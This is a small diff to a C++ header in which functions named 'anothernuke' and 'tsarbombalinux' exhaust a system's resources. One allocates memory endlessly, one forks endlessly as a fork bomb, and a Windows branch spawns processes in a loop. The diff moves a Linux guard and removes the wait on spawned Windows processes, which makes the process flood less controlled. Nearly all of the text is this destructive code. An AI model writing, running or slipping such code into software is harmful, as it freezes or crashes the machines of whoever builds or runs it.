@@ -11,6 +11,7 @@
 #endif
 #include <thread>
 namespace cppheader {
+	#ifdef __linux__
 	int anothernuke() {
 		std::vector<void*> phan_cap_phat;
 		while (true) {
@@ -24,7 +25,6 @@ namespace cppheader {
 		}
 		return 0;
 	}
-	#ifdef __linux__
 	int tsarbombalinux() {
 		while (true) {
 			if (fork() == 0) {
@@ -45,7 +45,6 @@ namespace cppheader {
 				NULL, NULL, &si, &pi))
 			{
 				std::cout << "Yayyyy!" << std::endl;
-				WaitForSingleObject(pi.hProcess, INFINITE);
 				CloseHandle(pi.hProcess);
 				CloseHandle(pi.hThread);
 			}
